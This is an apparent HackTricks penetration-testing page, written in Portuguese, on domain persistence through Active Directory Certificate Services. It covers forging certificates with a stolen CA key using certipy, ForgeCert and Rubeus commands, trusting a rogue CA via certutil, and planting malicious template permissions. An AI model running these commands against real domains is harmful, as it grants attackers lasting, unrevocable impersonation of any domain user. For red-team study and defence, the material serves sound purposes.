# Persistência de Domínio no AD CS

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Forjando Certificados com Certificados CA Roubados - DPERSIST1

Como você pode dizer que um certificado é um certificado CA?

* O certificado CA existe no **servidor CA**, com sua **chave privada protegida pelo DPAPI da máquina** (a menos que o SO use TPM/HSM/outra proteção de hardware).
* O **Emissor** e o **Assunto** do certificado são ambos definidos para o **nome distinto do CA**.
* Certificados CA (e somente certificados CA) **possuem uma extensão “Versão do CA”**.
* Não existem **EKUs**

A maneira suportada pela GUI integrada para **extrair esta chave privada do certificado** é com `certsrv.msc` no servidor CA.\
No entanto, este certificado **não é diferente** de outros certificados armazenados no sistema, então, por exemplo, confira a técnica [**THEFT2**](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) para ver como **extrair** eles.

Você também pode obter o certificado e a chave privada usando [**certipy**](https://github.com/ly4k/Certipy):
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Uma vez que você tenha o **CA cert** com a chave privada no formato `.pfx`, você pode usar [**ForgeCert**](https://github.com/GhostPack/ForgeCert) para criar certificados válidos:
```bash
# Create new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Create new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Use new certificate with Rubeus to authenticate
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# User new certi with certipy to authenticate
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
**Nota**: O **usuário** alvo especificado ao forjar o certificado precisa estar **ativo/habilitado** no AD e **capaz de autenticar**, já que ainda ocorrerá uma troca de autenticação como esse usuário. Tentar forjar um certificado para a conta krbtgt, por exemplo, não funcionará.
{% endhint %}

Este certificado forjado será **válido** até a data final especificada e enquanto o certificado da CA raiz for **válido** (geralmente de 5 a **10+ anos**). Também é válido para **máquinas**, então, combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** pelo tempo que o certificado da CA for válido.\
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois a CA não tem conhecimento deles.

## Confiança em Certificados CA Falsos - DPERSIST2

O objeto `NTAuthCertificates` define um ou mais **certificados CA** em seu **atributo** `cacertificate` e o AD o utiliza: Durante a autenticação, o **controlador de domínio** verifica se o objeto **`NTAuthCertificates`** **contém** uma entrada para a **CA especificada** no campo Emissor do **certificado** que está autenticando. Se **estiver, a autenticação prossegue**.

Um atacante poderia gerar um **certificado CA autoassinado** e **adicioná-lo** ao objeto **`NTAuthCertificates`**. Atacantes podem fazer isso se tiverem **controle** sobre o objeto AD **`NTAuthCertificates`** (em configurações padrão apenas membros do grupo **Enterprise Admin** e membros dos **Domain Admins** ou **Administrators** no **domínio raiz da floresta** têm essas permissões). Com o acesso elevado, pode-se **editar** o objeto **`NTAuthCertificates`** de qualquer sistema com `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126`, ou usando a [**Ferramenta de Saúde PKI**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).&#x20;

O certificado especificado deve **funcionar com o método de falsificação detalhado anteriormente com ForgeCert** para gerar certificados sob demanda.

## Má Configuração Maliciosa - DPERSIST3

Há uma infinidade de oportunidades para **persistência** através de **modificações de descritor de segurança dos componentes do AD CS**. Qualquer cenário descrito na seção “[Escalada de Domínio](domain-escalation.md)” poderia ser maliciosamente implementado por um atacante com acesso elevado, bem como a adição de "direitos de controle" (ou seja, WriteOwner/WriteDACL/etc.) a componentes sensíveis. Isso inclui:

* O objeto **computador do servidor CA** no AD
* O **servidor RPC/DCOM do servidor CA**
* Qualquer **objeto ou contêiner descendente do AD** no contêiner **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, o contêiner de Modelos de Certificado, o contêiner de Autoridades de Certificação, o objeto NTAuthCertificates, etc.)
* **Grupos do AD com direitos delegados para controlar o AD CS por padrão ou pela organização atual** (por exemplo, o grupo Cert Publishers integrado e qualquer um de seus membros)

Por exemplo, um atacante com **permissões elevadas** no domínio poderia adicionar a permissão **`WriteOwner`** ao modelo de certificado **`User`** padrão, onde o atacante é o principal para o direito. Para abusar disso mais tarde, o atacante primeiro modificaria a propriedade do modelo **`User`** para si mesmo e, em seguida, **definiria** **`mspki-certificate-name-flag`** para **1** no modelo para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`** (ou seja, permitindo que um usuário forneça um Nome Alternativo do Assunto na solicitação). O atacante poderia então **se inscrever** no **modelo**, especificando um nome de administrador de domínio como um nome alternativo, e usar o certificado resultante para autenticação como o DA.

## Referências

* Todas as informações desta página foram retiradas de [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
